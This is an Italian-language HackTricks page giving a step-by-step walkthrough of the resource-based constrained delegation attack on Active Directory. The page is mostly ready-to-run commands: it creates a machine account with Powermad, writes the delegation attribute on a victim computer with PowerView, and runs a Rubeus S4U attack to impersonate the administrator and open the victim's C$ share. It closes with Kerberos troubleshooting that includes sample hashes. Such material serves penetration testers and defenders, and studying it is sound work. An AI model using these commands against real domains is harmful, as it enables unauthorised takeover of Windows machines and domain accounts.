# Delega vincolata basata su risorse

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Concetti di base della delega vincolata basata su risorse

Questo è simile alla [Delega Vincolata](constrained-delegation.md) di base ma **invece** di concedere autorizzazioni a un **oggetto** per **impersonare qualsiasi utente verso un servizio**. La Delega Vincolata basata su risorse **imposta nell'oggetto chi può impersonare qualsiasi utente verso di esso**.

In questo caso, l'oggetto vincolato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente verso di esso.

Un'altra differenza importante da questa Delega Vincolata rispetto alle altre deleghe è che qualsiasi utente con **autorizzazioni di scrittura su un account macchina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare il _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (nelle altre forme di Delega era necessario avere privilegi di amministratore di dominio).

### Nuovi concetti

Nella Delega Vincolata si diceva che il flag **`TrustedToAuthForDelegation`** all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self**. Ma non è del tutto vero.\
La realtà è che anche senza quel valore, puoi eseguire un **S4U2Self** contro qualsiasi utente se sei un **servizio** (hai un SPN) ma, se **hai `TrustedToAuthForDelegation`** il TGS restituito sarà **Forwardable** e se **non hai** quel flag il TGS restituito **non** sarà **Forwardable**.

Tuttavia, se il **TGS** utilizzato in **S4U2Proxy** **NON è Forwardable** cercare di abusare di una **Delega Vincolata di base** **non funzionerà**. Ma se stai cercando di sfruttare una **delega vincolata basata su risorse, funzionerà** (non si tratta di una vulnerabilità, è una funzionalità, apparentemente).

### Struttura dell'attacco

> Se hai **privilegi equivalenti di scrittura** su un **account Computer** puoi ottenere **accesso privilegiato** in quella macchina.

Supponiamo che l'attaccante abbia già **privilegi equivalenti di scrittura sull'account computer vittima**.

1. L'attaccante **compromette** un account che ha un **SPN** o **ne crea uno** ("Servizio A"). Nota che **qualsiasi** _Utente Admin_ senza nessun altro privilegio speciale può **creare** fino a 10 **oggetti Computer (**_**MachineAccountQuota**_**)** e impostare loro un **SPN**. Quindi l'attaccante può semplicemente creare un oggetto Computer e impostare un SPN.
2. L'attaccante **abusa del suo privilegio di SCRITTURA** sull'account computer vittima (ServizioB) per configurare **delega vincolata basata su risorse per consentire a ServizioA di impersonare qualsiasi utente** contro quel computer vittima (ServizioB).
3. L'attaccante usa Rubeus per eseguire un **attacco S4U completo** (S4U2Self e S4U2Proxy) da Servizio A a Servizio B per un utente **con accesso privilegiato a Servizio B**.
1. S4U2Self (dall'account compromesso/creato con SPN): Richiedi un **TGS di Amministratore per me** (Non Forwardable).
2. S4U2Proxy: Usa il **TGS non Forwardable** del passaggio precedente per richiedere un **TGS** da **Amministratore** all'**host vittima**.
3. Anche se stai usando un TGS non Forwardable, poiché stai sfruttando la delega vincolata basata su risorse, funzionerà.
4. L'attaccante può **pass-the-ticket** e **impersonare** l'utente per ottenere **accesso al servizio vittima B**.

Per verificare il _**MachineAccountQuota**_ del dominio puoi usare:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un Oggetto Computer

Puoi creare un oggetto computer all'interno del dominio utilizzando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione della **delega limitata basata su risorse**

**Utilizzando il modulo PowerShell di Active Directory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilizzando powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Eseguire un attacco S4U completo

Prima di tutto, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi abbiamo bisogno dell'hash di quella password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora, l'attacco può essere eseguito:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più ticket chiedendo una sola volta utilizzando il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Si noti che gli utenti hanno un attributo chiamato "**Non può essere delegato**". Se un utente ha questo attributo impostato su True, non sarà possibile impersonarlo. Questa proprietà può essere visualizzata all'interno di Bloodhound.
{% endhint %}

### Accesso

L'ultimo comando eseguirà l'**attacco completo S4U e inietterà il TGS** dall'Amministratore all'host vittima in **memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** dall'Amministratore, quindi sarà possibile accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso dei diversi ticket di servizio

Scopri i [**ticket di servizio disponibili qui**](silver-ticket.md#available-services).

## Errori di Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Questo significa che Kerberos è configurato per non utilizzare DES o RC4 e stai fornendo solo l hash RC4. Fornisci a Rubeus almeno l hash AES256 (o fornisci solo gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Questo significa che l'ora del computer corrente è diversa da quella del DC e Kerberos non sta funzionando correttamente.
* **`preauth_failed`**: Questo significa che il nome utente + hash forniti non funzionano per il login. Potresti aver dimenticato di inserire il "$" all'interno del nome utente quando generi gli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Questo potrebbe significare:
  * L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non ha abbastanza privilegi)
  * Il servizio richiesto non esiste (se richiedi un ticket per winrm ma winrm non è in esecuzione)
  * Il fakecomputer creato ha perso i suoi privilegi sul server vulnerabile e devi restituirli.

## Riferimenti

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
